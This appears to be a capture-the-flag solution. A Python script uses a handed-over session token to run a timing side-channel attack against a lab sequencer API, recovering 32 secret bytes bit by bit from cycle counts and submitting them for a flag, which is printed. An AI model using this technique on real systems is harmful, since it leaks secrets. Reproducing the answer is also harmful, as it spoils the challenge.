Requires W16.3 (signal discrimination). Read 32 bytes from slots 160-191, verify CRC, submit calibration.

```python
import json, ssl, urllib.request, pathlib, base64, uuid

ctx = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
sess = pathlib.Path("handover/corporate-session").read_text().strip()
h = {"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc", "Content-Type": "application/json"}

d0 = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://retained-archive.arwc.test/api/sequencer-specs/current",
                            headers={"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc"}),
    context=ctx).read())
rec = d0["record"]; seq_id = rec["record_id"]; revision = rec["revision"]; opcodes = rec["opcodes"]

def program(*instructions):
    encoded = bytearray()
    for name, *operands in instructions:
        encoded.append(opcodes[name])
        encoded += bytes((list(operands) + [0, 0, 0])[:3])
    return base64.b64encode(bytes(encoded)).decode()

def binding(**extra):
    return {"sequencer": seq_id, "revision": revision, "request_id": "req-" + uuid.uuid4().hex, **extra}

def measure_byte(slot):
    probes = (0, 1, 2, 4, 8, 16, 32, 64, 128)
    measurements = {p: [] for p in probes}
    for group in (probes[:7], probes[7:]):
        instr_list = [("TEST", slot, p) for p in group for _ in range(8)] + [("HALT",)]
        prog = program(*instr_list)
        resp = json.loads(urllib.request.urlopen(
            urllib.request.Request("https://retained-archive.arwc.test/api/signal-experiments",
                                    data=json.dumps(binding(operation="measure", program=prog)).encode(),
                                    headers=h, method="POST"), context=ctx).read())
        for obs in resp["record"]["observations"]:
            measurements[obs["probe"]].append(obs["cycles"])
    means = {p: sum(v)/len(v) for p, v in measurements.items()}
    value = 0
    for bit in range(8):
        if means[1 << bit] < means[0]:
            value |= 1 << bit
    return value

recovered = bytes(measure_byte(slot) for slot in range(160, 192))
field_rev = recovered[:2].decode(errors="replace").strip()
cal_b64 = base64.b64encode(recovered).decode()

body = json.dumps({
    "sequencer": seq_id, "revision": revision,
    "request_id": "req-" + uuid.uuid4().hex,
    "record_id": f"CAL-CRR-OG2-{field_rev}",
    "field_revision": field_rev,
    "calibration": cal_b64,
}).encode()
d = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://retained-archive.arwc.test/api/instrument-history/current",
                            data=body, headers=h, method="POST"), context=ctx).read())
print("record_id:", d["record"]["record_id"])   # CAL-CRR-OG2-R8
print("flag:", d["flag"])                        # FLAG{f82e02d682078cc0}
```

Flag: `FLAG{f82e02d682078cc0}` in the top-level `flag` field.
